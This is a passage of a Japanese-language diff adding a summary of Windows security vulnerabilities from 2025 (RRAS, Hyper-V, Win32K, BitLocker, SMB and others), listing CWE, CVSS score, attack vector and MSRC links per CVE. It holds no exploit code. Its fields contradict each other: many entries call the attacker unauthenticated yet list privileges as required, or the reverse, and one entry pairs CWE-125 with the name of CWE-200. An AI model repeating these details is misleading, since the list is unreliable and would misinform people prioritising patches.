+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49744
+• CVE-2025-48824
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48824
+• CVE-2025-47985
+    ◦ 影響を受けるコンポーネント: Windows Event Tracing
+    ◦ 脆弱性の種類 (CWE): CWE-822 (Untrusted Pointer Dereference)
+    ◦ 説明: Windows Event Tracingにおける信頼されていないポインタ逆参照により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47985
+• CVE-2025-47972
+    ◦ 影響を受けるコンポーネント: Microsoft Input Method Editor (IME)
+    ◦ 脆弱性の種類 (CWE): CWE-362 (Concurrent Execution Using Shared Resource With Improper Synchronization ('Race Condition'))
+    ◦ 説明: Microsoft Input Method Editor (IME)における不適切な同期を伴う共有リソースの同時実行（「競合状態」）により、認証された攻撃者がネットワーク経由で権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 8.0
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47972
+• CVE-2025-48817
+    ◦ 影響を受けるコンポーネント: Remote Desktop Client
+    ◦ 脆弱性の種類 (CWE): CWE-23 (Relative Path Traversal)
+    ◦ 説明: Remote Desktop Clientにおける相対パストラバーサルの脆弱性により、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48817
+• CVE-2025-49663
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49663
+• CVE-2025-48822
+    ◦ 影響を受けるコンポーネント: Windows Hyper-V
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Out-of-bounds Read)
+    ◦ 説明: Windows Hyper-Vにおける境界外読み取りの脆弱性により、認証されていない攻撃者がローカルでコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.6
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48822
+• CVE-2025-49657
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49657
+• CVE-2025-48814
+    ◦ 影響を受けるコンポーネント: Windows Remote Desktop Licensing Service
+    ◦ 脆弱性の種類 (CWE): CWE-306 (Missing Authentication for Critical Function)
+    ◦ 説明: Windows Remote Desktop Licensing Serviceにおける重要な機能の認証欠如により、認証されていない攻撃者がネットワーク経由でセキュリティ機能を回避できる可能性があります。
+    ◦ CVSS基本スコア: 7.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48814
+• CVE-2025-49740
+    ◦ 影響を受けるコンポーネント: Windows SmartScreen
+    ◦ 脆弱性の種類 (CWE): CWE-693 (Protection Mechanism Failure)
+    ◦ 説明: Windows SmartScreenにおける保護メカニズムの不備により、認証されていない攻撃者がネットワーク経由でセキュリティ機能を回避できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49740
+• CVE-2025-49668
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49668
+• CVE-2025-49659
+    ◦ 影響を受けるコンポーネント: Windows TDX.sys
+    ◦ 脆弱性の種類 (CWE): CWE-126 (Buffer Over-read)
+    ◦ 説明: Windows TDX.sysにおけるバッファオーバーリードにより、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49659
+• CVE-2025-49661
+    ◦ 影響を受けるコンポーネント: Windows Ancillary Function Driver for WinSock
+    ◦ 脆弱性の種類 (CWE): CWE-822 (Untrusted Pointer Dereference)
+    ◦ 説明: Windows Ancillary Function Driver for WinSockにおける信頼されていないポインタ逆参照により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49661
+• CVE-2025-49667
+    ◦ 影響を受けるコンポーネント: Windows Win32K - ICOMP
+    ◦ 脆弱性の種類 (CWE): CWE-415 (Double Free)
+    ◦ 説明: Windows Win32K - ICOMPにおけるダブルフリーの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49667
+• CVE-2025-49733
+    ◦ 影響を受けるコンポーネント: Windows Win32K - ICOMP
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Windows Win32K - ICOMPにおけるUse After Freeの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49733
+• CVE-2025-47973
+    ◦ 影響を受けるコンポーネント: Virtual Hard Disk (VHDX)
+    ◦ 脆弱性の種類 (CWE): CWE-126 (Buffer Over-read)
+    ◦ 説明: Virtual Hard Disk (VHDX)におけるバッファオーバーリードにより、認証されていない攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47973
+• CVE-2025-49691
+    ◦ 影響を受けるコンポーネント: Windows Media
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Mediaにおけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者が隣接ネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.0
+    ◦ 攻撃元区分: 隣接ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49691
+• CVE-2025-49690
+    ◦ 影響を受けるコンポーネント: Capability Access Management Service (camsvc)
+    ◦ 脆弱性の種類 (CWE): CWE-362 (Concurrent Execution Using Shared Resource With Improper Synchronization ('Race Condition'))
+    ◦ 説明: Capability Access Management Service (camsvc)における不適切な同期を伴う共有リソースの同時実行（「競合状態」）により、認証されていない攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.4
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49690
+• CVE-2025-47971
+    ◦ 影響を受けるコンポーネント: Virtual Hard Disk (VHDX)
+    ◦ 脆弱性の種類 (CWE): CWE-126 (Buffer Over-read)
+    ◦ 説明: Virtual Hard Disk (VHDX)におけるバッファオーバーリードにより、認証されていない攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47971
+• CVE-2025-49672
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49672
+• CVE-2025-49675
+    ◦ 影響を受けるコンポーネント: Kernel Streaming WOW Thunk Service Driver
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Kernel Streaming WOW Thunk Service DriverにおけるUse After Freeの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49675
+• CVE-2025-49676
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49676
+• CVE-2025-49679
+    ◦ 影響を受けるコンポーネント: Windows Shell
+    ◦ 脆弱性の種類 (CWE): CWE-197 (Numeric Truncation Error)
+    ◦ 説明: Windows Shellにおける数値切り捨てエラーにより、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49679
+重大度：Medium (CVSSスコア 5.5～6.8)
+• CVE-2025-49681
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Out-of-bounds Read)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)における境界外読み取りの脆弱性により、認証されていない攻撃者がネットワーク経由で情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 6.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49681
+• CVE-2025-48808
+    ◦ 影響を受けるコンポーネント: Windows Kernel
+    ◦ 脆弱性の種類 (CWE): CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
+    ◦ 説明: Windows Kernelにおける認証されていないアクターへの機密情報開示により、認証された攻撃者がローカルで情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 5.5
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48808
+• CVE-2025-47999
+    ◦ 影響を受けるコンポーネント: Windows Hyper-V
+    ◦ 脆弱性の種類 (CWE): CWE-820 (Missing Synchronization)
+    ◦ 説明: Windows Hyper-Vにおける同期の欠如により、認証された攻撃者が隣接ネットワーク経由でサービス拒否を引き起こす可能性があります。
+    ◦ CVSS基本スコア: 6.8
+    ◦ 攻撃元区分: 隣接ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47999
+• CVE-2025-49664
+    ◦ 影響を受けるコンポーネント: Windows User-Mode Driver Framework Host
+    ◦ 脆弱性の種類 (CWE): CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
+    ◦ 説明: Windows User-Mode Driver Framework Hostにおける認証されていないアクターへの機密情報開示により、認証された攻撃者がローカルで情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 5.5
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49664
+• CVE-2025-48803
+    ◦ 影響を受けるコンポーネント: Windows Virtualization-Based Security (VBS) Enclave
+    ◦ 脆弱性の種類 (CWE): CWE-353 (Missing Support for Integrity Check)
+    ◦ 説明: Windows Virtualization-Based Security (VBS) Enclaveにおける整合性チェックのサポート欠如により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 6.7
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 高
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48803
+• CVE-2025-48811
+    ◦ 影響を受けるコンポーネント: Windows Virtualization-Based Security (VBS) Enclave
+    ◦ 脆弱性の種類 (CWE): CWE-353 (Missing Support for Integrity Check)
+    ◦ 説明: Windows Virtualization-Based Security (VBS) Enclaveにおける整合性チェックのサポート欠如により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 6.7
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 高
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48811
+• CVE-2025-49684
+    ◦ 影響を受けるコンポーネント: Storage Port Driver
+    ◦ 脆弱性の種類 (CWE): CWE-126 (Buffer Over-read)
+    ◦ 説明: Storage Port Driverにおけるバッファオーバーリードにより、認証された攻撃者がローカルで情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 5.5
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49684
+• CVE-2025-47978
+    ◦ 影響を受けるコンポーネント: Windows Kerberos
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Out-of-bounds Read)
+    ◦ 説明: Windows Kerberosにおける境界外読み取りの脆弱性により、認証された攻撃者がネットワーク経由でサービス拒否を引き起こす可能性があります。
+    ◦ CVSS基本スコア: 6.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47978
+• CVE-2025-48800
+    ◦ 影響を受けるコンポーネント: Windows BitLocker
+    ◦ 脆弱性の種類 (CWE): CWE-693 (Protection Mechanism Failure)
+    ◦ 説明: Windows BitLockerにおける保護メカニズムの不備により、認証されていない攻撃者が物理的攻撃によってセキュリティ機能を回避できる可能性があります。
+    ◦ CVSS基本スコア: 6.8
+    ◦ 攻撃元区分: 物理
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48800
+• CVE-2025-47980
+    ◦ 影響を受けるコンポーネント: Windows Imaging Component
+    ◦ 脆弱性の種類 (CWE): CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
+    ◦ 説明: Windows Imaging Componentにおける認証されていないアクターへの機密情報開示により、認証されていない攻撃者がローカルで情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 6.2
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47980
+• CVE-2025-48823
+    ◦ 影響を受けるコンポーネント: Windows Cryptographic Services
+    ◦ 脆弱性の種類 (CWE): CWE-326 (Cryptographic Issues)
+    ◦ 説明: Windows Cryptographic Servicesにおける暗号化の問題により、認証されていない攻撃者がネットワーク経由で情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 5.9
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48823
+• CVE-2025-49658
+    ◦ 影響を受けるコンポーネント: Windows TDX.sys
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Out-of-bounds Read)
+    ◦ 説明: Windows TDX.sysにおける境界外読み取りの脆弱性により、認証された攻撃者がローカルで情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 5.5
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49658
+• CVE-2025-48003
+    ◦ 影響を受けるコンポーネント: Windows BitLocker
+    ◦ 脆弱性の種類 (CWE): CWE-693 (Protection Mechanism Failure)
+    ◦ 説明: Windows BitLockerにおける保護メカニズムの不備により、認証されていない攻撃者が物理的攻撃によってセキュリティ機能を回避できる可能性があります。
+    ◦ CVSS基本スコア: 6.8
+    ◦ 攻撃元区分: 物理
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48003
+• CVE-2025-49670
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 6.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49670
+• CVE-2025-48802
+    ◦ 影響を受けるコンポーネント: Windows SMB
+    ◦ 脆弱性の種類 (CWE): CWE-295 (Improper Certificate Validation)
+    ◦ 説明: Windows SMBにおける不適切な証明書検証により、認証された攻撃者がネットワーク経由でなりすましを実行できる可能性があります。
+    ◦ CVSS基本スコア: 6.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48802
+• CVE-2025-49722
+    ◦ 影響を受けるコンポーネント: Windows Print Spooler Components
+    ◦ 脆弱性の種類 (CWE): CWE-400 (Uncontrolled Resource Consumption)
+    ◦ 説明: Windows Print Spooler Componentsにおける制御されていないリソース消費により、認証された攻撃者が隣接ネットワーク経由でサービス拒否を引き起こす可能性があります。
+    ◦ CVSS基本スコア: 5.7
+    ◦ 攻撃元区分: 隣接ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49722
+• CVE-2025-49671
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Exposure of Sensitive Information to an Unauthorized Actor)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)における認証されていないアクターへの機密情報開示により、認証されていない攻撃者がネットワーク経由で情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 6.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49671
+
+
+
+
